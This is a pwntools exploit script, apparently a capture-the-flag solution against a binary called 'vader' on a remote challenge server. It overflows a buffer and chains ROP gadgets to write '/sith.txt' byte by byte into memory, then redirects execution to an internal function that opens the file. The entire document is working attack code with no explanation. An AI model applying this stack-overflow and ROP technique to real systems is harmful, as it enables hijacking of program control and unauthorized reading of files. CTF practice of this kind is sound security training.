from pwn import *

elf = ELF("vader")
#p = process(elf.path)
p = remote("0.cloud.chals.io",20712)
script = ''.join('''
        break *0x4015f8
''')
#p = gdb.debug(elf.path,gdbscript=script)

pop_rdi_ret = 0x000000000040165b
pop_rdx_ret = 0x00000000004011ce
pop_rsi_pop_r15_ret = 0x0000000000401659
pop_r8_ret = 0x00000000004011d9
addr_str_shith = 0x405050 

pop_rax_ret = 0x00000000004011da
pop_rbp_ret = 0x000000000040116d
ret = 0x0000000000401016

add_rax_r8b_ret = 0x00000000004010cd #: add byte ptr [rax], r8b ; ret



print(p.recvuntil(b">>> "))
buf = b"A" * 40

for idx,s in enumerate('/sit'):
    buf += p64(pop_r8_ret)
    buf += p64(ord(s))
    buf += p64(pop_rax_ret)
    buf += p64(addr_str_shith + idx)
    buf += p64(add_rax_r8b_ret)

buf += p64(ret)
buf += p64(elf.symbols['main'])

p.sendline(buf)

print(p.recvuntil(b">>> "))
buf = b"A" * 40

for idx,s in enumerate('h.tx'):
    buf += p64(pop_r8_ret)
    buf += p64(ord(s))
    buf += p64(pop_rax_ret)
    buf += p64(addr_str_shith + 4 + idx)
    buf += p64(add_rax_r8b_ret)

buf += p64(ret)
buf += p64(elf.symbols['main'])

p.sendline(buf)

print(p.recvuntil(b">>> "))
buf = b"A" * 40

buf += p64(pop_r8_ret)
buf += p64(ord('t'))
buf += p64(pop_rax_ret)
buf += p64(addr_str_shith + 8 )
buf += p64(add_rax_r8b_ret)

buf += p64(pop_rdi_ret)
buf += p64(addr_str_shith)


buf += p64(pop_rsi_pop_r15_ret)
buf += p64(0x402ee0) # "r"
buf += p64(0) # gomi


buf += p64(pop_rbp_ret)
buf += p64(0x405100)

buf += p64(0x401559)

p.sendline(buf)
p.interactive()

